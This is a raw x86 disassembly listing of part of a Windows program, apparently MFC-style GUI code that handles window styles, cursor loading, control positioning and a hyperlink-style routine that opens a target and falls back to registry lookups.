  403a3a:	8b 46 4c             	mov    0x4c(%esi),%eax
  403a3d:	85 c0                	test   %eax,%eax
  403a3f:	74 57                	je     0x403a98
  403a41:	57                   	push   %edi
  403a42:	8d 7e 58             	lea    0x58(%esi),%edi
  403a45:	85 ff                	test   %edi,%edi
  403a47:	74 07                	je     0x403a50
  403a49:	8b 47 04             	mov    0x4(%edi),%eax
  403a4c:	85 c0                	test   %eax,%eax
  403a4e:	75 3f                	jne    0x403a8f
  403a50:	8b 4e 20             	mov    0x20(%esi),%ecx
  403a53:	6a 00                	push   $0x0
  403a55:	6a 00                	push   $0x0
  403a57:	6a 31                	push   $0x31
  403a59:	51                   	push   %ecx
  403a5a:	ff 15 5c 86 41 00    	call   *0x41865c
  403a60:	50                   	push   %eax
  403a61:	e8 7e 06 01 00       	call   0x4140e4
  403a66:	8b 40 04             	mov    0x4(%eax),%eax
  403a69:	8d 54 24 0c          	lea    0xc(%esp),%edx
  403a6d:	52                   	push   %edx
  403a6e:	6a 3c                	push   $0x3c
  403a70:	50                   	push   %eax
  403a71:	ff 15 2c 80 41 00    	call   *0x41802c
  403a77:	8d 4c 24 0c          	lea    0xc(%esp),%ecx
  403a7b:	c6 44 24 21 01       	movb   $0x1,0x21(%esp)
  403a80:	51                   	push   %ecx
  403a81:	ff 15 30 80 41 00    	call   *0x418030
  403a87:	50                   	push   %eax
  403a88:	8b cf                	mov    %edi,%ecx
  403a8a:	e8 bb 06 01 00       	call   0x41414a
  403a8f:	8b 13                	mov    (%ebx),%edx
  403a91:	57                   	push   %edi
  403a92:	8b cb                	mov    %ebx,%ecx
  403a94:	ff 52 30             	call   *0x30(%edx)
  403a97:	5f                   	pop    %edi
  403a98:	6a 01                	push   $0x1
  403a9a:	8b cb                	mov    %ebx,%ecx
  403a9c:	e8 3d 06 01 00       	call   0x4140de
  403aa1:	6a 05                	push   $0x5
  403aa3:	ff 15 34 80 41 00    	call   *0x418034
  403aa9:	5e                   	pop    %esi
  403aaa:	5b                   	pop    %ebx
  403aab:	83 c4 3c             	add    $0x3c,%esp
  403aae:	c2 08 00             	ret    $0x8
  403ab1:	90                   	nop
  403ab2:	90                   	nop
  403ab3:	90                   	nop
  403ab4:	90                   	nop
  403ab5:	90                   	nop
  403ab6:	90                   	nop
  403ab7:	90                   	nop
  403ab8:	90                   	nop
  403ab9:	90                   	nop
  403aba:	90                   	nop
  403abb:	90                   	nop
  403abc:	90                   	nop
  403abd:	90                   	nop
  403abe:	90                   	nop
  403abf:	90                   	nop
  403ac0:	8b 41 60             	mov    0x60(%ecx),%eax
  403ac3:	50                   	push   %eax
  403ac4:	ff 15 3c 86 41 00    	call   *0x41863c
  403aca:	b8 01 00 00 00       	mov    $0x1,%eax
  403acf:	c2 0c 00             	ret    $0xc
  403ad2:	90                   	nop
  403ad3:	90                   	nop
  403ad4:	90                   	nop
  403ad5:	90                   	nop
  403ad6:	90                   	nop
  403ad7:	90                   	nop
  403ad8:	90                   	nop
  403ad9:	90                   	nop
  403ada:	90                   	nop
  403adb:	90                   	nop
  403adc:	90                   	nop
  403add:	90                   	nop
  403ade:	90                   	nop
  403adf:	90                   	nop
  403ae0:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  403ae6:	6a ff                	push   $0xffffffff
  403ae8:	68 d8 4d 41 00       	push   $0x414dd8
  403aed:	50                   	push   %eax
  403aee:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  403af5:	83 ec 14             	sub    $0x14,%esp
  403af8:	53                   	push   %ebx
  403af9:	56                   	push   %esi
  403afa:	57                   	push   %edi
  403afb:	8b f1                	mov    %ecx,%esi
  403afd:	e8 7a 07 01 00       	call   0x41427c
  403b02:	80 cc 01             	or     $0x1,%ah
  403b05:	50                   	push   %eax
  403b06:	8b 46 20             	mov    0x20(%esi),%eax
  403b09:	6a f0                	push   $0xfffffff0
  403b0b:	50                   	push   %eax
  403b0c:	ff 15 d8 85 41 00    	call   *0x4185d8
  403b12:	8b 4e 54             	mov    0x54(%esi),%ecx
  403b15:	8d 7e 54             	lea    0x54(%esi),%edi
  403b18:	8b 41 f8             	mov    -0x8(%ecx),%eax
  403b1b:	85 c0                	test   %eax,%eax
  403b1d:	75 08                	jne    0x403b27
  403b1f:	57                   	push   %edi
  403b20:	8b ce                	mov    %esi,%ecx
  403b22:	e8 c9 05 01 00       	call   0x4140f0
  403b27:	8d 4c 24 0c          	lea    0xc(%esp),%ecx
  403b2b:	e8 c6 05 01 00       	call   0x4140f6
  403b30:	8d 54 24 0c          	lea    0xc(%esp),%edx
  403b34:	8b ce                	mov    %esi,%ecx
  403b36:	52                   	push   %edx
  403b37:	c7 44 24 2c 00 00 00 	movl   $0x0,0x2c(%esp)
  403b3e:	00 
  403b3f:	e8 ac 05 01 00       	call   0x4140f0
  403b44:	8b 44 24 0c          	mov    0xc(%esp),%eax
  403b48:	8b 48 f8             	mov    -0x8(%eax),%ecx
  403b4b:	85 c9                	test   %ecx,%ecx
  403b4d:	75 0a                	jne    0x403b59
  403b4f:	8b 07                	mov    (%edi),%eax
  403b51:	8b ce                	mov    %esi,%ecx
  403b53:	50                   	push   %eax
  403b54:	e8 f9 06 01 00       	call   0x414252
  403b59:	8b ce                	mov    %esi,%ecx
  403b5b:	e8 20 01 00 00       	call   0x403c80
  403b60:	e8 71 04 01 00       	call   0x413fd6
  403b65:	68 00 7f 00 00       	push   $0x7f00
  403b6a:	6a 00                	push   $0x0
  403b6c:	ff 15 a8 86 41 00    	call   *0x4186a8
  403b72:	8b 56 20             	mov    0x20(%esi),%edx
  403b75:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  403b79:	51                   	push   %ecx
  403b7a:	52                   	push   %edx
  403b7b:	89 46 60             	mov    %eax,0x60(%esi)
  403b7e:	ff 15 38 86 41 00    	call   *0x418638
  403b84:	8d 5e 64             	lea    0x64(%esi),%ebx
  403b87:	6a 00                	push   $0x0
  403b89:	56                   	push   %esi
  403b8a:	8b cb                	mov    %ebx,%ecx
  403b8c:	e8 ad 05 01 00       	call   0x41413e
  403b91:	8b 3f                	mov    (%edi),%edi
  403b93:	8d 44 24 10          	lea    0x10(%esp),%eax
  403b97:	6a 01                	push   $0x1
  403b99:	50                   	push   %eax
  403b9a:	57                   	push   %edi
  403b9b:	56                   	push   %esi
  403b9c:	8b cb                	mov    %ebx,%ecx
  403b9e:	e8 8f 05 01 00       	call   0x414132
  403ba3:	8b ce                	mov    %esi,%ecx
  403ba5:	e8 a8 03 01 00       	call   0x413f52
  403baa:	8d 4c 24 0c          	lea    0xc(%esp),%ecx
  403bae:	c7 44 24 28 ff ff ff 	movl   $0xffffffff,0x28(%esp)
  403bb5:	ff 
  403bb6:	e8 1d 05 01 00       	call   0x4140d8
  403bbb:	8b 4c 24 20          	mov    0x20(%esp),%ecx
  403bbf:	5f                   	pop    %edi
  403bc0:	5e                   	pop    %esi
  403bc1:	5b                   	pop    %ebx
  403bc2:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  403bc9:	83 c4 20             	add    $0x20,%esp
  403bcc:	c3                   	ret
  403bcd:	90                   	nop
  403bce:	90                   	nop
  403bcf:	90                   	nop
  403bd0:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  403bd6:	6a ff                	push   $0xffffffff
  403bd8:	68 f8 4d 41 00       	push   $0x414df8
  403bdd:	50                   	push   %eax
  403bde:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  403be5:	56                   	push   %esi
  403be6:	8b f1                	mov    %ecx,%esi
  403be8:	8d 44 24 14          	lea    0x14(%esp),%eax
  403bec:	8d 4e 54             	lea    0x54(%esi),%ecx
  403bef:	50                   	push   %eax
  403bf0:	c7 44 24 10 00 00 00 	movl   $0x0,0x10(%esp)
  403bf7:	00 
  403bf8:	e8 5b 06 01 00       	call   0x414258
  403bfd:	8b ce                	mov    %esi,%ecx
  403bff:	e8 7c 00 00 00       	call   0x403c80
  403c04:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  403c08:	6a 01                	push   $0x1
  403c0a:	56                   	push   %esi
  403c0b:	51                   	push   %ecx
  403c0c:	8d 4e 64             	lea    0x64(%esi),%ecx
  403c0f:	e8 18 05 01 00       	call   0x41412c
  403c14:	8d 4c 24 14          	lea    0x14(%esp),%ecx
  403c18:	c7 44 24 0c ff ff ff 	movl   $0xffffffff,0xc(%esp)
  403c1f:	ff 
  403c20:	e8 b3 04 01 00       	call   0x4140d8
  403c25:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  403c29:	5e                   	pop    %esi
  403c2a:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  403c31:	83 c4 0c             	add    $0xc,%esp
  403c34:	c2 04 00             	ret    $0x4
  403c37:	90                   	nop
  403c38:	90                   	nop
  403c39:	90                   	nop
  403c3a:	90                   	nop
  403c3b:	90                   	nop
  403c3c:	90                   	nop
  403c3d:	90                   	nop
  403c3e:	90                   	nop
  403c3f:	90                   	nop
  403c40:	8b 44 24 04          	mov    0x4(%esp),%eax
  403c44:	6a 01                	push   $0x1
  403c46:	89 41 48             	mov    %eax,0x48(%ecx)
  403c49:	8b 49 20             	mov    0x20(%ecx),%ecx
  403c4c:	6a 00                	push   $0x0
  403c4e:	51                   	push   %ecx
  403c4f:	ff 15 84 86 41 00    	call   *0x418684
  403c55:	c2 04 00             	ret    $0x4
  403c58:	90                   	nop
  403c59:	90                   	nop
  403c5a:	90                   	nop
  403c5b:	90                   	nop
  403c5c:	90                   	nop
  403c5d:	90                   	nop
  403c5e:	90                   	nop
  403c5f:	90                   	nop
  403c60:	8b 44 24 04          	mov    0x4(%esp),%eax
  403c64:	6a 01                	push   $0x1
  403c66:	89 41 4c             	mov    %eax,0x4c(%ecx)
  403c69:	8b 49 20             	mov    0x20(%ecx),%ecx
  403c6c:	6a 00                	push   $0x0
  403c6e:	51                   	push   %ecx
  403c6f:	ff 15 84 86 41 00    	call   *0x418684
  403c75:	c2 04 00             	ret    $0x4
  403c78:	90                   	nop
  403c79:	90                   	nop
  403c7a:	90                   	nop
  403c7b:	90                   	nop
  403c7c:	90                   	nop
  403c7d:	90                   	nop
  403c7e:	90                   	nop
  403c7f:	90                   	nop
  403c80:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  403c86:	6a ff                	push   $0xffffffff
  403c88:	68 18 4e 41 00       	push   $0x414e18
  403c8d:	50                   	push   %eax
  403c8e:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  403c95:	83 ec 1c             	sub    $0x1c,%esp
  403c98:	56                   	push   %esi
  403c99:	8b f1                	mov    %ecx,%esi
  403c9b:	8b 46 50             	mov    0x50(%esi),%eax
  403c9e:	85 c0                	test   %eax,%eax
  403ca0:	0f 84 4a 01 00 00    	je     0x403df0
  403ca6:	8b 4e 20             	mov    0x20(%esi),%ecx
  403ca9:	8d 44 24 10          	lea    0x10(%esp),%eax
  403cad:	50                   	push   %eax
  403cae:	51                   	push   %ecx
  403caf:	ff 15 a0 86 41 00    	call   *0x4186a0
  403cb5:	8b 56 20             	mov    0x20(%esi),%edx
  403cb8:	52                   	push   %edx
  403cb9:	ff 15 6c 86 41 00    	call   *0x41866c
  403cbf:	50                   	push   %eax
  403cc0:	e8 95 03 01 00       	call   0x41405a
  403cc5:	85 c0                	test   %eax,%eax
  403cc7:	74 0c                	je     0x403cd5
  403cc9:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  403ccd:	51                   	push   %ecx
  403cce:	8b c8                	mov    %eax,%ecx
  403cd0:	e8 7b 04 01 00       	call   0x414150
  403cd5:	53                   	push   %ebx
  403cd6:	57                   	push   %edi
  403cd7:	8d 4c 24 0c          	lea    0xc(%esp),%ecx
  403cdb:	e8 16 04 01 00       	call   0x4140f6
  403ce0:	8d 54 24 0c          	lea    0xc(%esp),%edx
  403ce4:	8b ce                	mov    %esi,%ecx
  403ce6:	52                   	push   %edx
  403ce7:	c7 44 24 34 00 00 00 	movl   $0x0,0x34(%esp)
  403cee:	00 
  403cef:	e8 fc 03 01 00       	call   0x4140f0
  403cf4:	8b 46 20             	mov    0x20(%esi),%eax
  403cf7:	50                   	push   %eax
  403cf8:	ff 15 e0 85 41 00    	call   *0x4185e0
  403cfe:	50                   	push   %eax
  403cff:	e8 22 04 01 00       	call   0x414126
  403d04:	8b f8                	mov    %eax,%edi
  403d06:	8b 44 24 0c          	mov    0xc(%esp),%eax
  403d0a:	8d 54 24 10          	lea    0x10(%esp),%edx
  403d0e:	8b 48 f8             	mov    -0x8(%eax),%ecx
  403d11:	52                   	push   %edx
  403d12:	51                   	push   %ecx
  403d13:	50                   	push   %eax
  403d14:	8b 47 08             	mov    0x8(%edi),%eax
  403d17:	50                   	push   %eax
  403d18:	ff 15 28 80 41 00    	call   *0x418028
  403d1e:	8b 4f 04             	mov    0x4(%edi),%ecx
  403d21:	8b 56 20             	mov    0x20(%esi),%edx
  403d24:	51                   	push   %ecx
  403d25:	52                   	push   %edx
  403d26:	ff 15 dc 85 41 00    	call   *0x4185dc
  403d2c:	8b ce                	mov    %esi,%ecx
  403d2e:	e8 49 05 01 00       	call   0x41427c
  403d33:	8b 3d 4c 86 41 00    	mov    0x41864c,%edi
  403d39:	8b 54 24 1c          	mov    0x1c(%esp),%edx
  403d3d:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  403d41:	8b d8                	mov    %eax,%ebx
  403d43:	f6 c7 02             	test   $0x2,%bh
  403d46:	74 1f                	je     0x403d67
  403d48:	8b 44 24 24          	mov    0x24(%esp),%eax
  403d4c:	2b c1                	sub    %ecx,%eax
  403d4e:	2b c2                	sub    %edx,%eax
  403d50:	99                   	cltd
  403d51:	2b c2                	sub    %edx,%eax
  403d53:	d1 f8                	sar    $1,%eax
  403d55:	f7 d8                	neg    %eax
  403d57:	50                   	push   %eax
  403d58:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  403d5c:	6a 00                	push   $0x0
  403d5e:	50                   	push   %eax
  403d5f:	ff d7                	call   *%edi
  403d61:	8b 54 24 24          	mov    0x24(%esp),%edx
  403d65:	eb 06                	jmp    0x403d6d
  403d67:	03 d1                	add    %ecx,%edx
  403d69:	89 54 24 24          	mov    %edx,0x24(%esp)
  403d6d:	f6 c3 01             	test   $0x1,%bl
  403d70:	74 2f                	je     0x403da1
  403d72:	8b 44 24 20          	mov    0x20(%esp),%eax
  403d76:	8b 54 24 10          	mov    0x10(%esp),%edx
  403d7a:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  403d7e:	2b c2                	sub    %edx,%eax
  403d80:	2b c1                	sub    %ecx,%eax
  403d82:	6a 00                	push   $0x0
  403d84:	99                   	cltd
  403d85:	2b c2                	sub    %edx,%eax
  403d87:	d1 f8                	sar    $1,%eax
  403d89:	f7 d8                	neg    %eax
  403d8b:	50                   	push   %eax
  403d8c:	8d 44 24 20          	lea    0x20(%esp),%eax
  403d90:	50                   	push   %eax
  403d91:	ff d7                	call   *%edi
  403d93:	8b 44 24 20          	mov    0x20(%esp),%eax
  403d97:	8b 54 24 24          	mov    0x24(%esp),%edx
  403d9b:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  403d9f:	eb 25                	jmp    0x403dc6
  403da1:	f6 c3 02             	test   $0x2,%bl
  403da4:	74 12                	je     0x403db8
  403da6:	8b 44 24 20          	mov    0x20(%esp),%eax
  403daa:	8b 7c 24 10          	mov    0x10(%esp),%edi
  403dae:	8b c8                	mov    %eax,%ecx
  403db0:	2b cf                	sub    %edi,%ecx
  403db2:	89 4c 24 18          	mov    %ecx,0x18(%esp)
  403db6:	eb 0e                	jmp    0x403dc6
  403db8:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  403dbc:	8b 44 24 10          	mov    0x10(%esp),%eax
  403dc0:	03 c1                	add    %ecx,%eax
  403dc2:	89 44 24 20          	mov    %eax,0x20(%esp)
  403dc6:	8b 7c 24 1c          	mov    0x1c(%esp),%edi
  403dca:	6a 04                	push   $0x4
  403dcc:	2b d7                	sub    %edi,%edx
  403dce:	2b c1                	sub    %ecx,%eax
  403dd0:	52                   	push   %edx
  403dd1:	50                   	push   %eax
  403dd2:	57                   	push   %edi
  403dd3:	51                   	push   %ecx
  403dd4:	6a 00                	push   $0x0
  403dd6:	8b ce                	mov    %esi,%ecx
  403dd8:	e8 a5 04 01 00       	call   0x414282
  403ddd:	8d 4c 24 0c          	lea    0xc(%esp),%ecx
  403de1:	c7 44 24 30 ff ff ff 	movl   $0xffffffff,0x30(%esp)
  403de8:	ff 
  403de9:	e8 ea 02 01 00       	call   0x4140d8
  403dee:	5f                   	pop    %edi
  403def:	5b                   	pop    %ebx
  403df0:	8b 4c 24 20          	mov    0x20(%esp),%ecx
  403df4:	5e                   	pop    %esi
  403df5:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  403dfc:	83 c4 28             	add    $0x28,%esp
  403dff:	c3                   	ret
  403e00:	56                   	push   %esi
  403e01:	8b f1                	mov    %ecx,%esi
  403e03:	57                   	push   %edi
  403e04:	6a 05                	push   $0x5
  403e06:	8b 46 54             	mov    0x54(%esi),%eax
  403e09:	50                   	push   %eax
  403e0a:	e8 a1 02 00 00       	call   0x4040b0
  403e0f:	8b f8                	mov    %eax,%edi
  403e11:	33 c0                	xor    %eax,%eax
  403e13:	83 ff 20             	cmp    $0x20,%edi
  403e16:	0f 9f c0             	setg   %al
  403e19:	85 c0                	test   %eax,%eax
  403e1b:	89 46 48             	mov    %eax,0x48(%esi)
  403e1e:	75 13                	jne    0x403e33
  403e20:	6a 30                	push   $0x30
  403e22:	ff 15 e4 85 41 00    	call   *0x4185e4
  403e28:	57                   	push   %edi
  403e29:	8b ce                	mov    %esi,%ecx
  403e2b:	e8 80 00 00 00       	call   0x403eb0
  403e30:	5f                   	pop    %edi
  403e31:	5e                   	pop    %esi
  403e32:	c3                   	ret
  403e33:	6a 01                	push   $0x1
  403e35:	8b ce                	mov    %esi,%ecx
  403e37:	e8 04 fe ff ff       	call   0x403c40
  403e3c:	5f                   	pop    %edi
  403e3d:	5e                   	pop    %esi
  403e3e:	c3                   	ret
  403e3f:	90                   	nop
  403e40:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  403e44:	8b 54 24 04          	mov    0x4(%esp),%edx
  403e48:	81 ec 0c 01 00 00    	sub    $0x10c,%esp
  403e4e:	8d 44 24 00          	lea    0x0(%esp),%eax
  403e52:	56                   	push   %esi
  403e53:	50                   	push   %eax
  403e54:	6a 01                	push   $0x1
  403e56:	6a 00                	push   $0x0
  403e58:	51                   	push   %ecx
  403e59:	52                   	push   %edx
  403e5a:	ff 15 18 80 41 00    	call   *0x418018
  403e60:	8b f0                	mov    %eax,%esi
  403e62:	85 f6                	test   %esi,%esi
  403e64:	75 3c                	jne    0x403ea2
  403e66:	8b 54 24 04          	mov    0x4(%esp),%edx
  403e6a:	8d 44 24 08          	lea    0x8(%esp),%eax
  403e6e:	8d 4c 24 0c          	lea    0xc(%esp),%ecx
  403e72:	50                   	push   %eax
  403e73:	51                   	push   %ecx
  403e74:	56                   	push   %esi
  403e75:	52                   	push   %edx
  403e76:	c7 44 24 18 04 01 00 	movl   $0x104,0x18(%esp)
  403e7d:	00 
  403e7e:	ff 15 10 80 41 00    	call   *0x418010
  403e84:	8b 8c 24 1c 01 00 00 	mov    0x11c(%esp),%ecx
  403e8b:	8d 44 24 0c          	lea    0xc(%esp),%eax
  403e8f:	50                   	push   %eax
  403e90:	51                   	push   %ecx
  403e91:	ff 15 84 80 41 00    	call   *0x418084
  403e97:	8b 54 24 04          	mov    0x4(%esp),%edx
  403e9b:	52                   	push   %edx
  403e9c:	ff 15 14 80 41 00    	call   *0x418014
  403ea2:	8b c6                	mov    %esi,%eax
  403ea4:	5e                   	pop    %esi
  403ea5:	81 c4 0c 01 00 00    	add    $0x10c,%esp
  403eab:	c2 0c 00             	ret    $0xc
  403eae:	90                   	nop
  403eaf:	90                   	nop
  403eb0:	6a ff                	push   $0xffffffff
  403eb2:	68 40 4e 41 00       	push   $0x414e40
  403eb7:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  403ebd:	50                   	push   %eax
  403ebe:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  403ec5:	51                   	push   %ecx
  403ec6:	56                   	push   %esi
  403ec7:	8d 4c 24 04          	lea    0x4(%esp),%ecx
  403ecb:	e8 26 02 01 00       	call   0x4140f6
  403ed0:	8b 74 24 18          	mov    0x18(%esp),%esi
  403ed4:	c7 44 24 10 00 00 00 	movl   $0x0,0x10(%esp)
  403edb:	00 
  403edc:	83 fe 20             	cmp    $0x20,%esi
  403edf:	0f 87 ef 00 00 00    	ja     0x403fd4
  403ee5:	33 c0                	xor    %eax,%eax
  403ee7:	8a 86 84 40 40 00    	mov    0x404084(%esi),%al
  403eed:	ff 24 85 4c 40 40 00 	jmp    *0x40404c(,%eax,4)
  403ef4:	68 1c e4 41 00       	push   $0x41e41c
  403ef9:	8d 4c 24 08          	lea    0x8(%esp),%ecx
  403efd:	e8 1a 03 01 00       	call   0x41421c
  403f02:	e9 e0 00 00 00       	jmp    0x403fe7
  403f07:	68 f8 e3 41 00       	push   $0x41e3f8
  403f0c:	8d 4c 24 08          	lea    0x8(%esp),%ecx
  403f10:	e8 07 03 01 00       	call   0x41421c
  403f15:	e9 cd 00 00 00       	jmp    0x403fe7
  403f1a:	68 d4 e3 41 00       	push   $0x41e3d4
  403f1f:	8d 4c 24 08          	lea    0x8(%esp),%ecx
  403f23:	e8 f4 02 01 00       	call   0x41421c
  403f28:	e9 ba 00 00 00       	jmp    0x403fe7
  403f2d:	68 90 e3 41 00       	push   $0x41e390
  403f32:	8d 4c 24 08          	lea    0x8(%esp),%ecx
  403f36:	e8 e1 02 01 00       	call   0x41421c
  403f3b:	e9 a7 00 00 00       	jmp    0x403fe7
  403f40:	68 54 e3 41 00       	push   $0x41e354
  403f45:	8d 4c 24 08          	lea    0x8(%esp),%ecx
  403f49:	e8 ce 02 01 00       	call   0x41421c
  403f4e:	e9 94 00 00 00       	jmp    0x403fe7
  403f53:	68 20 e3 41 00       	push   $0x41e320
  403f58:	8d 4c 24 08          	lea    0x8(%esp),%ecx
  403f5c:	e8 bb 02 01 00       	call   0x41421c
  403f61:	e9 81 00 00 00       	jmp    0x403fe7
  403f66:	68 c0 e2 41 00       	push   $0x41e2c0
  403f6b:	8d 4c 24 08          	lea    0x8(%esp),%ecx
  403f6f:	e8 a8 02 01 00       	call   0x41421c
  403f74:	eb 71                	jmp    0x403fe7
  403f76:	68 a4 e2 41 00       	push   $0x41e2a4
  403f7b:	8d 4c 24 08          	lea    0x8(%esp),%ecx
  403f7f:	e8 98 02 01 00       	call   0x41421c
  403f84:	eb 61                	jmp    0x403fe7
  403f86:	68 58 e2 41 00       	push   $0x41e258
  403f8b:	8d 4c 24 08          	lea    0x8(%esp),%ecx
  403f8f:	e8 88 02 01 00       	call   0x41421c
  403f94:	eb 51                	jmp    0x403fe7
  403f96:	68 20 e2 41 00       	push   $0x41e220
  403f9b:	8d 4c 24 08          	lea    0x8(%esp),%ecx
  403f9f:	e8 78 02 01 00       	call   0x41421c
  403fa4:	eb 41                	jmp    0x403fe7
  403fa6:	68 d8 e1 41 00       	push   $0x41e1d8
  403fab:	8d 4c 24 08          	lea    0x8(%esp),%ecx
  403faf:	e8 68 02 01 00       	call   0x41421c
  403fb4:	eb 31                	jmp    0x403fe7
  403fb6:	68 a0 e1 41 00       	push   $0x41e1a0
  403fbb:	8d 4c 24 08          	lea    0x8(%esp),%ecx
  403fbf:	e8 58 02 01 00       	call   0x41421c
  403fc4:	eb 21                	jmp    0x403fe7
  403fc6:	68 80 e1 41 00       	push   $0x41e180
  403fcb:	8d 4c 24 08          	lea    0x8(%esp),%ecx
  403fcf:	e8 48 02 01 00       	call   0x41421c
  403fd4:	56                   	push   %esi
  403fd5:	8d 4c 24 08          	lea    0x8(%esp),%ecx
  403fd9:	68 60 e1 41 00       	push   $0x41e160
  403fde:	51                   	push   %ecx
  403fdf:	e8 a4 02 01 00       	call   0x414288
  403fe4:	83 c4 0c             	add    $0xc,%esp
  403fe7:	8d 54 24 04          	lea    0x4(%esp),%edx
  403feb:	8d 44 24 18          	lea    0x18(%esp),%eax
  403fef:	52                   	push   %edx
  403ff0:	68 44 e1 41 00       	push   $0x41e144
  403ff5:	50                   	push   %eax
  403ff6:	e8 d3 01 01 00       	call   0x4141ce
  403ffb:	50                   	push   %eax
  403ffc:	8d 4c 24 08          	lea    0x8(%esp),%ecx
  404000:	c6 44 24 14 01       	movb   $0x1,0x14(%esp)
  404005:	e8 4e 02 01 00       	call   0x414258
  40400a:	8d 4c 24 18          	lea    0x18(%esp),%ecx
  40400e:	c6 44 24 10 00       	movb   $0x0,0x10(%esp)
  404013:	e8 c0 00 01 00       	call   0x4140d8
  404018:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  40401c:	6a 00                	push   $0x0
  40401e:	6a 30                	push   $0x30
  404020:	51                   	push   %ecx
  404021:	e8 b4 01 01 00       	call   0x4141da
  404026:	8d 4c 24 04          	lea    0x4(%esp),%ecx
  40402a:	c7 44 24 10 ff ff ff 	movl   $0xffffffff,0x10(%esp)
  404031:	ff 
  404032:	e8 a1 00 01 00       	call   0x4140d8
  404037:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  40403b:	5e                   	pop    %esi
  40403c:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  404043:	83 c4 10             	add    $0x10,%esp
  404046:	c2 04 00             	ret    $0x4
  404049:	8d 49 00             	lea    0x0(%ecx),%ecx
  40404c:	f4                   	hlt
  40404d:	3e 40                	ds inc %eax
  40404f:	00 1a                	add    %bl,(%edx)
  404051:	3f                   	aas
  404052:	40                   	inc    %eax
  404053:	00 07                	add    %al,(%edi)
  404055:	3f                   	aas
  404056:	40                   	inc    %eax
  404057:	00 40 3f             	add    %al,0x3f(%eax)
  40405a:	40                   	inc    %eax
  40405b:	00 b6 3f 40 00 2d    	add    %dh,0x2d00403f(%esi)
  404061:	3f                   	aas
  404062:	40                   	inc    %eax
  404063:	00 c6                	add    %al,%dh
  404065:	3f                   	aas
  404066:	40                   	inc    %eax
  404067:	00 53 3f             	add    %dl,0x3f(%ebx)
  40406a:	40                   	inc    %eax
  40406b:	00 86 3f 40 00 76    	add    %al,0x7600403f(%esi)
  404071:	3f                   	aas
  404072:	40                   	inc    %eax
  404073:	00 66 3f             	add    %ah,0x3f(%esi)
  404076:	40                   	inc    %eax
  404077:	00 a6 3f 40 00 96    	add    %ah,-0x69ffbfc1(%esi)
  40407d:	3f                   	aas
  40407e:	40                   	inc    %eax
  40407f:	00 d4                	add    %dl,%ah
  404081:	3f                   	aas
  404082:	40                   	inc    %eax
  404083:	00 00                	add    %al,(%eax)
  404085:	0d 01 02 0d 03       	or     $0x30d0201,%eax
  40408a:	0d 0d 04 0d 0d       	or     $0xd0d040d,%eax
  40408f:	05 0d 0d 0d 0d       	add    $0xd0d0d0d,%eax
  404094:	0d 0d 0d 0d 0d       	or     $0xd0d0d0d,%eax
  404099:	0d 0d 0d 0d 0d       	or     $0xd0d0d0d,%eax
  40409e:	06                   	push   %es
  40409f:	07                   	pop    %es
  4040a0:	08 09                	or     %cl,(%ecx)
  4040a2:	0a 0b                	or     (%ebx),%cl
  4040a4:	0c 90                	or     $0x90,%al
  4040a6:	90                   	nop
  4040a7:	90                   	nop
  4040a8:	90                   	nop
  4040a9:	90                   	nop
  4040aa:	90                   	nop
  4040ab:	90                   	nop
  4040ac:	90                   	nop
  4040ad:	90                   	nop
  4040ae:	90                   	nop
  4040af:	90                   	nop
  4040b0:	81 ec 08 02 00 00    	sub    $0x208,%esp
  4040b6:	8b 84 24 0c 02 00 00 	mov    0x20c(%esp),%eax
  4040bd:	53                   	push   %ebx
  4040be:	55                   	push   %ebp
  4040bf:	8b ac 24 18 02 00 00 	mov    0x218(%esp),%ebp
  4040c6:	56                   	push   %esi
  4040c7:	57                   	push   %edi
  4040c8:	55                   	push   %ebp
  4040c9:	6a 00                	push   $0x0
  4040cb:	6a 00                	push   $0x0
  4040cd:	50                   	push   %eax
  4040ce:	68 7c e4 41 00       	push   $0x41e47c
  4040d3:	6a 00                	push   $0x0
  4040d5:	8b f9                	mov    %ecx,%edi
  4040d7:	ff 15 cc 85 41 00    	call   *0x4185cc
  4040dd:	8b f0                	mov    %eax,%esi
  4040df:	83 fe 20             	cmp    $0x20,%esi
  4040e2:	0f 87 bc 00 00 00    	ja     0x4041a4
  4040e8:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  4040ec:	51                   	push   %ecx
  4040ed:	68 74 e4 41 00       	push   $0x41e474
  4040f2:	68 00 00 00 80       	push   $0x80000000
  4040f7:	8b cf                	mov    %edi,%ecx
  4040f9:	e8 42 fd ff ff       	call   0x403e40
  4040fe:	85 c0                	test   %eax,%eax
  404100:	0f 85 9e 00 00 00    	jne    0x4041a4
  404106:	8b 1d 90 80 41 00    	mov    0x418090,%ebx
  40410c:	8d 54 24 10          	lea    0x10(%esp),%edx
  404110:	68 60 e4 41 00       	push   $0x41e460
  404115:	52                   	push   %edx
  404116:	ff d3                	call   *%ebx
  404118:	8d 44 24 10          	lea    0x10(%esp),%eax
  40411c:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  404120:	50                   	push   %eax
  404121:	51                   	push   %ecx
  404122:	68 00 00 00 80       	push   $0x80000000
  404127:	8b cf                	mov    %edi,%ecx
  404129:	e8 12 fd ff ff       	call   0x403e40
  40412e:	85 c0                	test   %eax,%eax
  404130:	75 72                	jne    0x4041a4
  404132:	8d 54 24 10          	lea    0x10(%esp),%edx
  404136:	68 58 e4 41 00       	push   $0x41e458
